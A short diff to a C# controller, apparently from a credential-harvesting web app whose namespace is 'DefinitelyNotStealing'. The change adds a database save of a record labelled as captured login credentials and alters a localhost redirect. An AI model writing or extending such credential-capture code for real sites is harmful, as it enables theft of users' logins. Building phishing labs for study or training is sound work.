@@ -40,7 +40,8 @@ namespace DefinitelyNotStealing.Controllers
                 DataType = "Login credentials - from redirect",
                 Timestamp = DateTime.UtcNow
             });
-            return Redirect("https://localhost:44300/");
+            await _ctx.SaveChangesAsync();
+            return Redirect("https://localhost:5001/");
         }
     }
 }
